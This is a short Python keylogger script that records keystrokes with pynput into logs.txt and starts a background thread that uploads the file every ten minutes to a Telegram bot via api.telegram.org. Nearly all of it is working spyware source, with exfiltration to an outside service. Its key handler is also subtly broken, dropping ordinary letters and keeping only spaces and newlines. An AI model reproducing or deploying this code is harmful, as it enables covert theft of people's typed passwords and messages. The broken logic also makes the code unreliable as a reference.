from pynput.keyboard import Listener, Key
import requests
import threading
import time

# ===== KEYLOGGER (captures keylogs and saves on a file) =====
def log_keystroke(key):
    try:
        if key == Key.space:
            key_to_write = " "
        elif key == Key.enter:
            key_to_write = "\n"
        elif key == Key.backspace:
            key_to_write = ""  # ignore backspace
        else:
            # For other special keys, ignore them
            return
    except:
        return
    
    with open("logs.txt", "a", encoding='utf-8') as file:
        file.write(key_to_write)
        file.flush()

# ===== SENDING TO TELEGRAM  =====
BOT_TOKEN = "your_bot_token"
CHAT_ID = "your_chat_id(tg_accnt_id)"

def send_logs():
    try:
        # Send the file 
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        with open("logs.txt", "rb") as file:
            files = {"document": file}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            print("Logs sent to Telegram!")
        else:
            print(f"Failed to send: {response.status_code}")
    except Exception as e:
        print(f"Error sending logs: {e}")

# ===== SCHEDULER TO SEND LOGS =====
def send_periodically():
    while True:
        send_logs()
        time.sleep(600)  # 600 seconds = 10 minutes , for testing 

# Start the sender in a background thread
sender_thread = threading.Thread(target=send_periodically, daemon=True)
sender_thread.start()

# ===== START KEYLOGGER =====
print("Keylogger running. Will send logs every 10 minutes.")
print("Press Ctrl+C to stop.")

with Listener(on_press=log_keystroke) as listener:
    listener.join()
